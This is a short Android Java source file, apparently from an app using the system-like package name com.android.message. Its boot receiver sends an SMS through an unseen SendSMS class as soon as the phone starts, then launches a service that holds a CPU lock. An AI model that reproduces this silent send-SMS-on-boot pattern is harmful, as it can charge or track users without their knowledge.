package com.android.message;


import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootBroadcastReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		//系统启动成功
		
		//lzd
		if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)){
			//发送短信
			SendSMS sms = new SendSMS(context);
			sms.sendSMS();
			
			//System.exit(0);
		}
		
		//lzd 先获取CPU锁
		Intent i = new Intent();
		i.setClass(context, RunCPU.class);
		context.startService(i);
		//lzd
		System.exit(0);
		
	}

}
